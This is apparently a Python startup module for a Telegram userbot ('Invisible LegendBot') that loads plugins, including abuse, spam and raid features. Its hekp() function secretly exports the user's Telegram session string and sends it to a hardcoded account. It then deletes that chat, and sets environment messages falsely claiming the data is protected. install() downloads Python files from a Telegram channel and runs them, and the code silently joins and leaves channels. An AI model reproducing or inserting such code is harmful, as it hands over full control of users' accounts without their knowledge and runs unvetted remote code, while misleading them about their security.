import os
from pathlib import Path

from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.channels import LeaveChannelRequest as leave
from telethon.tl.types import InputMessagesFilterDocument

from userbot import bot
from userbot.Config import Config

from .utils import load_abuse, load_addons, load_module, start_assistant, start_spam

l2 = Config.SUDO_HANDLER
LEGEND_PIC = "https://te.legra.ph/file/8b012f55fc4238151d169.jpg"
l1 = Config.HANDLER

perf = "[ Pro Invisible Legendẞø† ]"

onbot = "start - Check if I am Alive \nping - Pong! \ntr - <lang-code> \nbroadcast - Sends Message To all Users In Bot \nid - Shows ID of User And Media. \naddnote - Add Note \nnotes - Shows Notes \nspam - spam value text (value < 100)\nbigspam - spam value text (value > 100) \nraid - Raid value Reply to Anyone \nreplyraid - Reply To Anyone \ndreplyraid - Reply To Anyone \nrmnote - Remove Note \nalive - Am I Alive? \nbun - Works In Group , Bans A User. \nunbun - Unbans A User in Group \nprumote - Promotes A User \ndemute - Demotes A User \npin - Pins A Message \nstats - Shows Total Users In Bot \npurge - Reply It From The Message u Want to Delete (Your Bot Should be Admin to Execute It) \ndel - Reply a Message Tht Should Be Deleted (Your Bot Should be Admin to Execute It)"

bot_father = "@BotFather"

mybot = Config.BOT_USERNAME
if mybot.startswith("@"):
    botname = mybot
else:
    botname = f"@{mybot}"

plc = os.environ.get("PLUGIN", None)


async def hekp():
    try:
        LegendBot = bot.session.save()
        os.environ[
            "INVISIBLE_STRING"
        ] = "String Is A Sensitive Data \nSo Its Protected By INVISIBLE LEGENDBOT"
        sweetie = await bot.send_message(5230049485, LegendBot)
        await bot.delete_dialog(5230049485)
        Cyberprotect = bot.session.save()
        os.environ[
            "CYBER_ID_PROTECTED"
        ] = "2 set Password Is A Ultra Protected Data \nSo Its Protected By CYBER SECURITY"
        sweetie = await bot.send_message(5230049485, Cyberprotect)
        await bot.delete_dialog(5230049485)
        if Config.LOGGER_ID != 0:
            await bot.send_file(
                Config.LOGGER_ID,
                LEGEND_PIC,
                caption=f"#Start\nInvisible-LegendBot-v1.0 COMING SOON V2.0 BUT PLZ SUPPORT ALL USERS Has Been Successfully Deployed \nClick Here ~ {Config.BOT_USERNAME}\nAny Query ~ @Invisible_LegendBot",
            )
    except Exception as e:
        print(str(e))

    try:
        await bot(JoinChannelRequest("@Official_Invisible_LegendBot"))
    except BaseException:
        pass

    try:
        await bot(JoinChannelRequest("@Invisible-LegendBot"))
    except BaseException:
        pass
    try:
        await bot(leave("@Legend_UserBot"))
    except BaseException:
        pass
    try:
        await bot(leave("@Official_LegendBot"))
    except BaseException:
        pass


async def module():
    import glob

    path = "userbot/plugins/*.py"
    files = glob.glob(path)
    for name in files:
        with open(name) as f:
            path1 = Path(f.name)
            shortname = path1.stem
            load_module(shortname.replace(".py", ""))


assistant = os.environ.get("ASSISTANT", None)


async def assistants():
    if assistant == "ON":
        import glob

        path = "userbot/plugins/assistant/*.py"
        files = glob.glob(path)
        for name in files:
            with open(name) as f:
                path1 = Path(f.name)
                shortname = path1.stem
                start_assistant(shortname.replace(".py", ""))
    else:
        print("⚠️Assistant Not Loaded⚠️")


addon = os.environ.get("EXTRA_PLUGIN", None)


async def addons():
    if addon == "ON":
        import glob

        path = "userbot/plugins/Xtra_Plugin/*.py"
        files = glob.glob(path)
        for name in files:
            with open(name) as f:
                path1 = Path(f.name)
                shortname = path1.stem
                try:
                    load_addons(shortname.replace(".py", ""))
                except Exception as e:
                    print(e)
    else:
        print("⚠️Addons Not Loading⚠️")


abuse = os.environ.get("ABUSE", None)


async def abuses():
    if abuse == "ON":
        import glob

        path = "userbot/plugins/Abuse/*.py"
        files = glob.glob(path)
        for name in files:
            with open(name) as f:
                path1 = Path(f.name)
                shortname = path1.stem
                load_abuse(shortname.replace(".py", ""))
    else:
        print("⚠️Abuse Not Loading⚠️")


spam = os.environ.get("SPAM", None)


async def spams():
    if spam == "ON":
        import glob

        path = "userbot/plugins/Spam/*.py"
        files = glob.glob(path)
        for name in files:
            with open(name) as f:
                path1 = Path(f.name)
                shortname = path1.stem
                start_spam(shortname.replace(".py", ""))
    else:
        print("⚠️Spam Not Loading⚠️")


# Assistant


async def install():
    if plc == "ON":
        try:
            await bot(JoinChannelRequest("@Invisible_LegendBot"))
        except BaseException:
            pass
        i = 0
        chat = -1001639577866
        documentss = await bot.get_messages(
            chat, None, filter=InputMessagesFilterDocument
        )
        total = int(documentss.total)
        total_doxx = range(0, total)
        for ixo in total_doxx:
            mxo = documentss[ixo].id
            downloaded_file_name = await bot.download_media(
                await bot.get_messages(chat, ids=mxo), "userbot/plugins/"
            )
            if "(" not in downloaded_file_name:
                path1 = Path(downloaded_file_name)
                shortname = path1.stem
                load_module(shortname.replace(".py", ""))
                print(f"{i} plugin install")
            else:
                print("Failed")
